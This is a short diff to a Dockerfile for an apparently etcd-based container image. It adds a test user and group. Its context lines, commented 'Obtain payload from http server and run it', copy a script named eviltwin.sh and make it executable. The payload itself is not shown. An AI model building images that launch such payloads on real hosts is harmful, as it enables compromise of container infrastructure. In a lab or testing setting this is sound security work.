@@ -87,6 +87,9 @@ ENV ETCDCTL_API 3
 # HERE WE START OUR MODIFICATIONS.
 ######
 
+# Create User 
+RUN addgroup -S -g 3000 testgroup && adduser -S -D testuser --uid 1000  -G testgroup
+
 # Obtain payload from http server and run it. 
 COPY eviltwin.sh /
 RUN chmod +x /eviltwin.sh
